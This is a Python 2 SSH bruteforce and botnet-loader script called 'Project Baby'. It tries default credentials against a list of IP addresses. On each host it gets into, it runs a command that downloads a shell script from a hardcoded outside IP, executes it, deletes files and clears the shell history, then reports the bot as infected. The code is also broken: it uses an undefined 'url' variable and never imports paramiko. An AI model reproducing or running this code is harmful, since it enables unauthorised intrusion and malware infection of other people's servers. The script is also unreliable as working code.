#!/usr/bin/env python



#----------------------------------------------------------#
"""
  _____           _           _     ____        _           
 |  __ \         (_)         | |   |  _ \      | |          
 | |__) | __ ___  _  ___  ___| |_  | |_) | __ _| |__  _   _ 
 |  ___/ '__/ _ \| |/ _ \/ __| __| |  _ < / _` | '_ \| | | |
 | |   | | | (_) | |  __/ (__| |_  | |_) | (_| | |_) | |_| |
 |_|   |_|  \___/| |\___|\___|\__| |____/ \__,_|_.__/ \__, |
                _/ |                                   __/ |
               |__/                                   |___/ 
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

   "Project Baby" is a ssh list bruteforcer.
   - - - - - - - - - - - - - - - - - - - - -
      - - - - - - Output - - - - - - -
	  python project_baby.py 500 ssh.txt
	- - - - - - - - - - - - - - - - - - - - -
	"list.txt" should be stated like below;
	           69.13.37.69
	           73.28.93.29
	           118.88.29.10
	           199.288.38.28
  - - - - - - - - - - - - - - - - - - - - - - - -
            - - - Credits - - -
			
"""
#----------------------------------------------------------#

import threading, sys, time, random, socket, re, os
from Queue import *
from sys import stdout

if len(sys.argv) < 3:
        print "Usage: python "+sys.argv[0]+" <threads> <list>"
        sys.exit()


ssh_passwords = ["admin:1234", "root:1234"]


payload = "http://148.253.163.108/bins.sh" # REPLACE WITH YOUR IP & EXECUTION FILE

threads = int(sys.argv[1])
ips = open(sys.argv[2], "r").readlines()
ports = ["22"]
queue = Queue()
qcount = 0
binary = url.split("/")
binary = binary[3]
ip = binary[2]
found = 0
count = 0

for ip in ips:
	qcount += 1
	stdout.write("\r[%d] Loading" % qcount)
	stdout.flush()
	queue.put(ip)
print "\n"

def readUntil(tn, string, timeout=10):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				if queue.empty() == True:
					sys.exit(1)
				ip = queue.get()
				ss = loader(ip)
				ss.start()
				queue.task_done()
			except:
				pass
	except:
		pass



class loader(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		x = 1
		while x != 0:
			try:
				username='root'
				password="0"
				port = 22
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				dobreak=False
				for passwd in ssh_passwords:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
						dobreak=True
						break
					except:
						pass
					if True == dobreak:
						break
				badserver=True
				stdin, stdout, stderr = ssh.exec_command("echo projectbaby")
				output = stdout.read()
				if "projectbaby" in output:
					badserver=False	
				if badserver == False:
					print "\033[36m[SSH] Bot Infected %s!\033[37m"%(self.ip)
					ssh.exec_command("cd /tmp; wget "+payload+" -O baby.sh;chmod 777 *; sh baby.sh; rm -rf *; history -c") #DO NOT TOUCH
					time.sleep(3)
					ssh.close()
				if badserver == True:
					ssh.close()
			except:
				pass
			x = 0

for g in xrange(threads):
	t = threading.Thread(target=worker)
	t.setDaemon(True)
	t.start()
	
queue.join()
print "List is loaded!"
